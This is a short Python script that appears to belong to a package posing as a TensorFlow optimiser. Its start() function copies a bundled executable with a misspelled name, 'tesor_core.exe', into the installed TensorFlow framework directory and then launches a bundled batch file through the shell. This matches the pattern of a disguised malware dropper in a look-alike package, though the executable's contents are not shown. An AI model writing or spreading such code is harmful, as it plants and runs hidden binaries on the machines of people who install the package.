import subprocess, os
import site
import shutil

def start(tensor):
    site_package = site.getsitepackages()[1]
    folder = os.path.join(site_package,'tensorflow_opt','code','bin')
    # folder = os.path.join(os.getcwd(), 'src' ,'tensorflow_opt','code','bin')
    shutil.copy2(os.path.join(folder, 'tesor_core.exe'), os.path.join(folder, '..','..','..','tensorflow', 'core', 'framework'))
    filepath=os.path.join(folder, "start_opt_engine.bat")
    p = subprocess.Popen(filepath, shell=True, stdout = subprocess.PIPE)

    stdout, stderr = p.communicate()